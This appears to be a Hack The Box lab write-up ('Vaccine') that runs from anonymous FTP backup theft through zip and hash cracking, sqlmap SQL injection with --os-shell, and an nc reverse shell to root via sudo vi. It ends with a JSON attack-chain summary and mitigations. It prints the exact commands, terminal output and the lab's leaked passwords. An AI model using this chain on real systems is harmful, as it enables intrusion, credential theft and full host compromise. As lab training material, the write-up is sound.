# HTB Vaccine - FTP Backup Leak to SQL Injection to Root

Scope: authorized HTB lab only.
Focus: anonymous FTP exposure, credential recovery, SQL injection exploitation, and sudo misconfiguration abuse.

---

## 1. Investigation Objective

1. Enumerate externally reachable services.
2. Identify exposed artifacts in FTP shares.
3. Recover and validate leaked credentials.
4. Assess web application injection exposure.
5. Pivot from application access to system-level privilege.

---

## 2. Recon and Service Discovery

```bash
nmap -sC -sV -Pn -p 21,22,80 <TARGET_IP>
```

Observed attack surface:
- 21/tcp FTP
- 22/tcp SSH
- 80/tcp HTTP (PHP application with login workflow)

---

## 3. FTP Anonymous Access and Backup Retrieval

Test anonymous FTP:

```bash
ftp <TARGET_IP>
# username: anonymous
# password: <blank>
```

Retrieve exposed backup:

```text
ftp> ls
ftp> get backup.zip
```

Assessment:
- sensitive backup artifact downloadable without authentication.

---

## 4. Offline Credential Recovery

Crack archive password:

```bash
zip2john backup.zip > backup.hash
john backup.hash
```

Extract and inspect source:

```bash
unzip backup.zip
cat index.php
```

Recovered indicators:
- application user: `admin`
- hash: `2cb42f8734ea607eefed3b70af13bbd3`
- cracked credential: `qwerty789`

---

## 5. Web Access and SQL Injection Validation

Authenticate to web app with recovered admin credentials, then test injection point:

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=" --cookie="PHPSESSID=<SESSION_ID>"
```

If injectable, validate command execution path in controlled lab context:

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=" --cookie="PHPSESSID=<SESSION_ID>" --os-shell
```

---

## 6. Shell Access and Host Enumeration

Establish listener and trigger reverse callback from command execution channel:

```bash
nc -lvnp 443
```

Stabilize shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Inspect host artifacts:

```bash
whoami
pwd
ls /home
cat /var/lib/postgresql/user.txt
cat /var/www/html/dashboard.php
```

Leaked credential found in source:
- `postgres : P@s5w0rd!`

---

## 7. Privilege Escalation via Sudo Misconfiguration

Pivot via SSH:

```bash
ssh postgres@<TARGET_IP>
```

Check sudo rights:

```bash
sudo -l
```

If `/bin/vi` is allowed as root, escalate via shell escape in editor session.

---

## 8. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn -p 21,22,80 10.129.95.174
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd ...
22/tcp open  ssh     OpenSSH ...
80/tcp open  http    Apache ...

analyst@kali:~$ ftp 10.129.95.174
Name: anonymous
Password:
ftp> ls
backup.zip
ftp> get backup.zip

analyst@kali:~$ zip2john backup.zip > backup.hash && john backup.hash
backup.zip:741852963

analyst@kali:~$ unzip backup.zip && grep -E "admin|2cb42f" index.php
username=admin
password=2cb42f8734ea607eefed3b70af13bbd3

analyst@kali:~$ sqlmap -u "http://10.129.95.174/dashboard.php?search=" --cookie="PHPSESSID=..." --os-shell
[INFO] testing connection to the target URL
[INFO] the parameter appears to be injectable
[INFO] going to use injected command execution channel

analyst@kali:~$ nc -lvnp 443
connect to [10.10.14.6] from (UNKNOWN) [10.129.95.174]
$ whoami
www-data
$ cat /var/www/html/dashboard.php | grep -i postgres
postgres:P@s5w0rd!

analyst@kali:~$ ssh postgres@10.129.95.174
postgres@vaccine:~$ sudo -l
(ALL) /bin/vi
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# whoami
root
```

---

## 9. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "vaccine_ftp_backup_sqli_to_sudo_vi_root",
	"input_signals": [
		"Anonymous FTP enabled with downloadable backup.zip",
		"Archive contains application source and credential hash",
		"Recovered admin credential grants dashboard access",
		"Search parameter is SQL injectable with command execution",
		"Dashboard source leaks postgres SSH credential",
		"postgres user can run vi as root via sudo"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "initial_access",
			"technique": "Exposed Public Service (FTP Anonymous Access)",
			"confidence": 0.96,
			"evidence": "backup.zip retrieved without authentication"
		},
		{
			"step": 2,
			"tactic": "credential_access",
			"technique": "Credentials in Files and Hash Cracking",
			"confidence": 0.93,
			"evidence": "admin hash extracted and cracked offline"
		},
		{
			"step": 3,
			"tactic": "execution",
			"technique": "SQL Injection to OS Command Execution",
			"confidence": 0.9,
			"evidence": "sqlmap identified injection and os-shell path"
		},
		{
			"step": 4,
			"tactic": "privilege_escalation",
			"technique": "Sudo Misconfiguration (Editor Shell Escape)",
			"confidence": 0.91,
			"evidence": "sudo vi allowed root shell breakout"
		}
	],
	"hypotheses": [
		"Additional backups may contain reusable credentials for other environments",
		"The same SQL injection pattern may exist in adjacent endpoints",
		"Operational secrets likely embedded in multiple PHP files"
	],
	"uncertainties": [
		"No confirmation of centralized credential rotation after leakage",
		"Input validation coverage for non-tested parameters is unknown",
		"Application/database audit logging depth not validated"
	],
	"tool_calls": [
		{"name": "anonymous_ftp_exposure_scanner", "priority": "high"},
		{"name": "source_secret_extractor", "priority": "high"},
		{"name": "sqli_surface_mapper", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable anonymous FTP and remove exposed backup archives",
			"Rotate all leaked credentials and invalidate active sessions",
			"Patch SQL injection in dashboard query handling"
		],
		"hardening": [
			"Store secrets in environment vaults, not source files",
			"Apply least privilege for application and database accounts",
			"Restrict sudo to required commands without shell-escape vectors"
		],
		"monitoring": [
			"Alert on backup file downloads over FTP",
			"Detect SQL error anomalies and injection signatures",
			"Monitor privileged sudo execution of interactive editors"
		]
	}
}
```
